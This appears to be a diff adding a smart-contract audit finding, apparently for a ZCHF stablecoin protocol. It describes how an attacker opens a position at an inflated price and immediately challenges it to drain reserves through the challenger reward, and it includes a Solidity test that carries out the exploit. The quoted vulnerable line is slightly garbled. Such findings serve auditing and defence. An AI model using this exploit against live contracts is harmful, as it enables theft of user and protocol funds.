@@ -1,0 +1,24 @@
+Type of vulnerability: AMM price oracle manipulation
+Cause of vulnerability: The vulnerability arises from the way the CHALLENGER_REWARD is calculated based on the user-provided price, allowing an attacker to abuse the protocol and drain reserves.
+Execution process: The attacker mints the maximum ZCHF, sets a very high price for a position, and immediately starts a challenge. Due to the inflated price, the challenge will always succeed, allowing the attacker to drain reserves and mint a large number of ZCHF in one transaction.
+Detailed characteristics: The vulnerability allows the attacker to manipulate the price oracle by setting an inflated price for a position, leading to excessive CHALLENGER_REWARD payouts and draining of reserves.
+Vulnerable code:
+```
+uint256 reward = (volume * CHALLENGERREWARD) / 1000\000;
+```
+```solidity
+function test10AbuseChallengeReward() public {
+    // Open a position with fake inflated price and dummy collateral.
+    // _challengeSeconds set to 0 so we can immediately challenge and end
+    xchf_.approve(address(hub), 1 ether); // Collateral
+    zchf.approve(address(hub), 1000 ether); // 1000 OPENING_FEE
+    address myPosition = hub.openPosition(address(xchf_), 1 ether, 1 ether, 1000 ether, 3 days, 10 days, 0, 0, 0, type(uint256).max / 1e20, 0);
+    // Start launchChallenge and immediately end the auction.
+    // We will receive the 1 xchf collateral back
+    // and 2% of inflated collateral price in zchf as CHALLENGER_REWARD
+    // zchf is first taken all from reserve, and rest minted
+    xchf_.approve(address(hub), 1 ether); // Collateral
+    uint256 challengeID = hub.launchChallenge(myPosition, 1 ether);
+    hub.end(challengeID);
+}
+```
